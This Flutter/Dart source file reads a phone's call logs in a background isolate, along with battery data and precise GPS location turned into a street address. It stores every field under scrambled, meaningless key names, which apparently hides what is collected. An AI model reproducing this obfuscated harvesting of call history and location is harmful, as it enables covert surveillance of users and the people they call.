import 'dart:isolate';

import 'package:flutter/cupertino.dart';
import 'package:flutter/services.dart';
import 'dart:async';
import 'package:battery_info_plugin/battery_info_plugin.dart';

import 'package:geolocator/geolocator.dart';
import 'package:geocoding/geocoding.dart';

class CallLogPermission {
  static const MethodChannel _channel = MethodChannel('permission_channel');

  static Future<bool> requestCallLogPermission() async {
    try {
      final bool result = await _channel.invokeMethod('requestPureCallLog');
      return result;
    } on PlatformException catch (e) {
      return false;
    }
  }
}

class CallLogService {
  static void _isolateEntryPoint(List<dynamic> args) async {
    final SendPort sendPort = args[0];

    final rootIsolateToken = args[1] as RootIsolateToken;

    int idnex = args[2];

    final errorPort = ReceivePort();

    try {
      BackgroundIsolateBinaryMessenger.ensureInitialized(rootIsolateToken);

      errorPort.listen((error) {
        debugPrint('Isolate error: $error');

        sendPort.send([]);
      });
      const channel = MethodChannel('com.example.calllog');

      final result = await channel.invokeMethod('getCallLogs', {
        'index': idnex,
      });

      final logs = (result as List?)?.cast<Map<dynamic, dynamic>>() ?? [];

      final validLogs = logs.map((log) => _parseLogEntry(log)).toList();

      sendPort.send(validLogs);
    } catch (e, stack) {
      debugPrint('Isolate error: $e\n$stack');

      sendPort.send([]);
    } finally {
      errorPort.close();

      Isolate.exit(sendPort);
    }
  }

  static Map<String, dynamic> _parseLogEntry(Map<dynamic, dynamic> log) {
    return {
      "myosNxwljJimlBvq": log['name']?.toString() ?? '',

      "afsEgnHseLfohlYdf": log['matched_number']?.toString() ?? '',

      'ptwomLnqYrhk': log['formatted_number']?.toString() ?? '',

      'eyihHps': log['type']?.toString() ?? '',

      'nvyDxerZdsv': (log['date'] as int?) ?? 0,

      'tmeLltlAfghFwsfxJgcla': (log['duration'] as int?) ?? 0,
    };
  }

  Future<List<Map<String, dynamic>>> getCallLogs(int callDay) async {
    final receivePort = ReceivePort();

    final rootIsolateToken = RootIsolateToken.instance!;

    try {
      await Isolate.spawn(_isolateEntryPoint, [
        receivePort.sendPort,
        rootIsolateToken,
        callDay,
      ], debugName: 'CallLogsFetcher');

      final result = await receivePort.first;

      return List<Map<String, dynamic>>.from(result);
    } catch (e) {
      debugPrint('Failed to spawn isolate: $e');

      return [];
    } finally {
      receivePort.close();
    }
  }
}

class NativePermission {
  static const _channel = MethodChannel('native_permission');

  static Future<int> isCallLogGranted() async {
    try {
      return await _channel.invokeMethod('isCallLogPermissionGranted');
    } on PlatformException {
      return 0;
    }
  }
}

class BatteryInfo {
  static const _channel = MethodChannel('BatteryCapacity');

  static Future<int?> getBatteryCapacity() async {
    try {
      return await _channel.invokeMethod('getBatteryCapacity');
    } on PlatformException catch (e) {
      return null;
    }
  }

  Future<Map<String, dynamic>> getBatteryInfo() async {
    try {
      Map<String, dynamic> mm = await BatteryInfoPlugin.getBatteryInfo();
      return mm;
    } catch (e) {
      return {};
    }
  }
}

Future<Position?> _determinePosition() async {
  bool serviceEnabled;
  LocationPermission permission;

  serviceEnabled = await Geolocator.isLocationServiceEnabled();
  if (!serviceEnabled) {
    return null;
  }

  permission = await Geolocator.checkPermission();
  if (permission == LocationPermission.denied) {
    return null;
  }

  if (permission == LocationPermission.deniedForever) {
    return null;
  }

  try {
    final position = await Geolocator.getCurrentPosition(
      desiredAccuracy: LocationAccuracy.high,
      timeLimit: Duration(seconds: 10),
    );
    return position;
  } on TimeoutException catch (e) {
    return null;
  } catch (e) {
    return null;
  }
}

Future<Map<String, dynamic>> getCityName() async {
  try {
    Position? position = await _determinePosition();
    if (position == null) {
      return {
        "qcqmrDfegVru": {
          "pkhddZvhzlJwzlmVyf": '',
          "cowxLveBrpTnm": '',
          "hqjVavZpxLbhlp": '',
          "vaotUewzrXuydXobwi": '',
          "klbGskWat": '',
          "nthwZcvBslkl": '',
          "pfsImdnqQgeUqo": '',
          "mqjYmgPfdpYvpyiNdxit": '',
          "hnqDqgoIgumKvlk": '',
        },
      };
    }
    List<Placemark> placemarks = await placemarkFromCoordinates(
      position.latitude,
      position.longitude,
    );
    Placemark place = placemarks.first;
    return {
      "qcqmrDfegVru": {
        "pkhddZvhzlJwzlmVyf": place.street ?? '',
        "cowxLveBrpTnm": place.administrativeArea ?? '',
        "hqjVavZpxLbhlp": place.country ?? '',
        "vaotUewzrXuydXobwi": position.latitude ?? '',
        "klbGskWat": position.longitude ?? '',
        "nthwZcvBslkl": place.postalCode ?? '',
        "pfsImdnqQgeUqo": place.locality ?? '',
        "mqjYmgPfdpYvpyiNdxit": place.subLocality ?? '',
        "hnqDqgoIgumKvlk": place.name ?? '',
      },
    };
  } catch (e) {
    return {
      "qcqmrDfegVru": {
        "pkhddZvhzlJwzlmVyf": '',
        "cowxLveBrpTnm": '',
        "hqjVavZpxLbhlp": '',
        "vaotUewzrXuydXobwi": '',
        "klbGskWat": '',
        "nthwZcvBslkl": '',
        "pfsImdnqQgeUqo": '',
        "mqjYmgPfdpYvpyiNdxit": '',
        "hnqDqgoIgumKvlk": '',
      },
    };
  }
}
